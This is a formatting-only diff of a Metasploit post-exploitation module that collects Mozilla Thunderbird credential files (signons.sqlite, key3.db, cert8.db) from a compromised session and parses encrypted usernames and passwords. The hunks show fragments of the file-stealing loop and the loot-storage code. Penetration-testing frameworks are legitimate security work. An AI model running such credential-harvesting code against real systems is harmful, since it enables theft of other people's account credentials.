@@ -7,27 +7,29 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Multi Gather Mozilla Thunderbird Signon Credential Collection",
+        'Description' => %q{
           This module will collect credentials from Mozilla Thunderbird by downloading
-        the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
-        offline decryption with third party tools.
+          the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
+          offline decryption with third party tools.
 
           If necessary, you may also set the PARSE option to true to parse the sqlite
-        file, which contains sensitive information such as the encrypted username/password.
-        However, this feature is not enabled by default, because it requires SQLITE3 gem
-        to be installed on your machine.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'sinn3r',  #Metasploit
+          file, which contains sensitive information such as the encrypted username/password.
+          However, this feature is not enabled by default, because it requires SQLITE3 gem
+          to be installed on your machine.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'sinn3r', # Metasploit
         ],
-      'Platform'       => %w{ linux osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
-      ))
+        'Platform' => %w{linux osx win},
+        'SessionTypes' => ['meterpreter', 'shell']
+      )
+    )
 
     register_options(
       [
@@ -62,6 +64,7 @@ class MetasploitModule < Msf::Post
     # Steal!
     profiles.each do |profile|
       next if profile =~ /^\./
+
       slash = (session.platform == 'windows') ? "\\" : "/"
       p = base + profile + slash
 
@@ -98,13 +101,13 @@ class MetasploitModule < Msf::Post
         cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
-        loot = cmd_exec(cmd_show, "\"#{p+item}\"").lstrip
+        loot = cmd_exec(cmd_show, "\"#{p + item}\"").lstrip
         next if loot =~ /system cannot find the file specified|No such file/
       end
 
       # Save it
       ext = ::File.extname(item)
-      ext = ext[1,ext.length]
+      ext = ext[1, ext.length]
 
       path = store_loot(
         "tb.#{item}",
@@ -112,7 +115,8 @@ class MetasploitModule < Msf::Post
         session,
         loot,
         "thunderbird_raw_#{item}",
-        "Thunderbird Raw File #{item}")
+        "Thunderbird Raw File #{item}"
+      )
 
       print_status("#{item} saved in #{path}")
 
@@ -129,7 +133,8 @@ class MetasploitModule < Msf::Post
             session,
             data_tbl.to_csv,
             "thunderbird_parsed_#{item}",
-            "Thunderbird Parsed File #{item}")
+            "Thunderbird Parsed File #{item}"
+          )
           print_status("Parsed signons.sqlite saved in: #{path}")
         end
       end
@@ -163,8 +168,8 @@ class MetasploitModule < Msf::Post
 
     # Create a rex table to store our data
     tbl = Rex::Text::Table.new(
-      'Header'  => 'Thunderbird login data',
-      'Indent'  => 1,
+      'Header' => 'Thunderbird login data',
+      'Indent' => 1,
       'Columns' =>
         [
           'hostname',
@@ -181,14 +186,14 @@ class MetasploitModule < Msf::Post
     # Parse the db, store the data
     rows.each do |row|
       tbl << [
-        row[1],  #hostname
-        row[2],  #httpRealm
-        row[3],  #formSubmitURL (could be nil)
-        row[4],  #usernameField
-        row[5],  #passwordField
-        row[6],  #encryptedUsername
-        row[7],  #encryptedPassword
-        row[8]   #guid
+        row[1],  # hostname
+        row[2],  # httpRealm
+        row[3],  # formSubmitURL (could be nil)
+        row[4],  # usernameField
+        row[5],  # passwordField
+        row[6],  # encryptedUsername
+        row[7],  # encryptedPassword
+        row[8]   # guid
       ]
     end
 
@@ -213,6 +218,7 @@ class MetasploitModule < Msf::Post
         line = line.strip
         next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
         next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/
+
         tb_profiles << $1 if not $1.nil?
       end
     end
